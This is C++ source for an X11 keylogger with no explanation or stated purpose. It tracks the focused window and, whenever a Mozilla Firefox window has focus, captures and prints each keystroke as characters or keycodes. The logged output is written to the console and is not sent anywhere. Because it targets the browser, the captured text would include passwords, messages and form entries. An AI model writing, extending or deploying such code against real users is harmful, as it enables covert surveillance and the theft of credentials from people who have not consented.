#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <iostream>
#include <unistd.h>
#include <X11/Xatom.h>
#include <string.h>
using namespace std;


string WINDOWS_FIREFOX = "Mozilla Firefox";

char *name (Display *disp, Window win) {
    Atom prop = XInternAtom(disp,"WM_NAME",False), type;
    int form;
    unsigned long remain, len;
    unsigned char *list;
    if (XGetWindowProperty(disp,win,prop,0,1024,False,AnyPropertyType,
                &type,&form,&len,&remain,&list) != Success) {
        return strdup("Root");
    }
    return (char*)list;
}

int main(int argc, char* argv[]){
    Display *disp = XOpenDisplay(NULL);
    Window activeWindow = -1;
    char* active;
    char buf[17];
    KeySym ks;
    XComposeStatus comp;
    int len;
    int revert;
    string activeName;
    Window root = DefaultRootWindow(disp);
    XGetInputFocus (disp, &activeWindow, &revert);
    XSelectInput(disp, activeWindow, KeyPressMask|KeyReleaseMask|FocusChangeMask);
    active = name(disp, activeWindow);
	if (active != NULL) cout << string(active);
    while (1) {
        XEvent ev;
        XNextEvent(disp, &ev);
        switch (ev.type) {
            case FocusOut: 
            {
                XGetInputFocus (disp, &activeWindow, &revert);
				if (activeWindow == 1) break;
                if (name(disp,activeWindow) != NULL){
					if (active == NULL){
						active = name(disp,activeWindow);
					}
					else {
						string old = string(active);                    
						active = name(disp,activeWindow);
						if ( old.compare(string(active)) != 0){
				            cout << "Changed to ";
							cout<<string(active);
				            cout<<endl;
						}
					}
                }
                if (activeWindow == PointerRoot) {
                    activeWindow = root;
                }       
				XGetInputFocus (disp, &activeWindow, &revert);        
                XSelectInput(disp, activeWindow, KeyPressMask|KeyReleaseMask|FocusChangeMask);	 
                break;
            }

            case KeyPress: 
            {
                if (active != NULL){
                    activeName = string(active);
                    if (activeName.find(WINDOWS_FIREFOX) != std::string::npos){
                        len = XLookupString(&ev.xkey, buf, 16, &ks, &comp);
                        if (len > 0 && isprint(buf[0])) {
                            buf[len]=0;
                            cout << "Keypressed: " << buf << endl;
                        }
                        else {
                            cout << "Keycode: " << (int)ks << endl;
                        }
                    }
                }
                break;
            }
        }
    }
    XCloseDisplay(disp);
}
